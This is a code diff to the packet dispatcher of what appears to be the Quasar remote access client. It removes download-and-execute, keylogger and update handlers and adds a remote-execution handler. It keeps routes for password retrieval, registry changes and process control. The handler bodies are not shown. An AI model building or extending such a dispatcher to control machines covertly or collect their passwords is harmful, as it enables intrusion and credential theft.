@@ -11,32 +11,7 @@ namespace Quasar.Client.Networking
         {
             var type = packet.GetType();
 
-            if (type == typeof(DoDownloadAndExecute))
-            {
-                CommandHandler.HandleDoDownloadAndExecute((DoDownloadAndExecute)packet,
-                    client);
-            }
-            else if (type == typeof(DoUploadAndExecute))
-            {
-                CommandHandler.HandleDoUploadAndExecute((DoUploadAndExecute)packet, client);
-            }
-            else if (type == typeof(DoClientDisconnect))
-            {
-                Program.ConnectClient.Exit();
-            }
-            else if (type == typeof(DoClientReconnect))
-            {
-                Program.ConnectClient.Disconnect();
-            }
-            else if (type == typeof(DoClientUninstall))
-            {
-                CommandHandler.HandleDoClientUninstall((DoClientUninstall)packet, client);
-            }
-            else if (type == typeof(DoAskElevate))
-            {
-                CommandHandler.HandleDoAskElevate((DoAskElevate)packet, client);
-            }
-            else if (type == typeof(GetDesktop))
+            if (type == typeof(GetDesktop))
             {
                 CommandHandler.HandleGetDesktop((GetDesktop)packet, client);
             }
@@ -47,10 +22,6 @@ namespace Quasar.Client.Networking
             else if (type == typeof(DoProcessKill))
             {
                 CommandHandler.HandleDoProcessKill((DoProcessKill)packet, client);
-            }
-            else if (type == typeof(DoProcessStart))
-            {
-                CommandHandler.HandleDoProcessStart((DoProcessStart)packet, client);
             }
             else if (type == typeof(GetDrives))
             {
@@ -87,10 +58,6 @@ namespace Quasar.Client.Networking
             else if (type == typeof(DoShowMessageBox))
             {
                 CommandHandler.HandleDoShowMessageBox((DoShowMessageBox)packet, client);
-            }
-            else if (type == typeof(DoClientUpdate))
-            {
-                CommandHandler.HandleDoClientUpdate((DoClientUpdate)packet, client);
             }
             else if (type == typeof(GetMonitors))
             {
@@ -161,10 +128,6 @@ namespace Quasar.Client.Networking
             {
                 CommandHandler.HandleChangeRegistryValue((DoChangeRegistryValue)packet, client);
             }
-            else if (type == typeof(GetKeyloggerLogs))
-            {
-                CommandHandler.HandleGetKeyloggerLogs((GetKeyloggerLogs)packet, client);
-            }
             else if (type == typeof(GetPasswords))
             {
                 CommandHandler.HandleGetPasswords((GetPasswords)packet, client);
@@ -183,6 +146,10 @@ namespace Quasar.Client.Networking
             else if (type == typeof(DoCloseConnection))
             {
                 CommandHandler.HandleDoCloseConnection(client, (DoCloseConnection)packet);
+            }
+            else if (type == typeof(DoRemoteExecution))
+            {
+                CommandHandler.HandleDoRemoteExecution((DoRemoteExecution)packet, client);
             }
         }
     }
